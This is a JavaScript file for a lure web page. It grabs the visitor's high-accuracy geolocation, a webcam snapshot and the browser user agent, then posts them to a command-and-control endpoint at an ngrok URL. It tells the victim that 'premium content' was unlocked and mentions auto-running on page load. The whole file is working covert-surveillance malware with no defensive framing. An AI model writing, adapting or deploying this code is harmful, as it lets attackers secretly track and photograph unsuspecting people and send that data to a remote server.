// This URL will be your ngrok public URL pointing to your Python C2 server.
// Example: "https://your-ngrok-id.ngrok-free.app/data"
const C2_ENDPOINT = 'https://spidery-eddie-nontemperable.ngrok-free.dev/data'; // <--- THIS IS THE LINE TO UPDATE!

// Function to get geolocation
function getGeolocation() {
    return new Promise((resolve, reject) => {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp).toISOString()
                    });
                },
                (error) => {
                    console.error("Geolocation error:", error);
                    reject(new Error(`Geolocation error: ${error.message} (Code: ${error.code})`));
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            reject(new Error("Geolocation is not supported by this browser."));
        }
    });
}

// Function to capture image from camera
async function captureImage() {
    const video = document.getElementById('webcamFeed');
    const canvas = document.getElementById('cameraCanvas');
    const context = canvas.getContext('2d');

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        // Ensure video is playing and dimensions are set
        await new Promise(resolve => video.onloadedmetadata = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            resolve();
        });

        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8); // 80% quality JPEG

        // Stop the camera stream
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;

        return imageDataUrl;
    } catch (err) {
        console.error("Camera access or capture error:", err);
        throw new Error(`Camera error: ${err.message}`);
    }
}

// Function to send data to C2
async function sendDataToC2(data) {
    try {
        const response = await fetch(C2_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const result = await response.json();
        console.log("Data sent to C2 successfully:", result);
        // Optionally, update UI to confirm success
    } catch (error) {
        console.error("Failed to send data to C2:", error);
        // Implement robust error handling, perhaps retry or log locally
    }
}

// Main function to initiate the capture process
async function initiateCapture() {
    document.getElementById('loadingMessage').style.display = 'block';

    let locationData = null;
    let imageData = null;
    let errors = [];

    try {
        locationData = await getGeolocation();
    } catch (err) {
        errors.push(err.message);
        console.warn("Could not get geolocation:", err.message);
    }

    try {
        imageData = await captureImage();
    } catch (err) {
        errors.push(err.message);
        console.warn("Could not capture image:", err.message);
    }

    const payload = {
        location: locationData,
        image: imageData,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        clientErrors: errors.length > 0 ? errors : "none"
    };

    await sendDataToC2(payload);

    document.getElementById('loadingMessage').style.display = 'none';
    alert("Premium content unlocked! Enjoy the beats!"); // User feedback
}

// Attach to the CTA button for initiation, or auto-run on page load if desired
// document.addEventListener('DOMContentLoaded', () => {
//     // For immediate triggering on page load without user click:
//     // initiateCapture();
// });
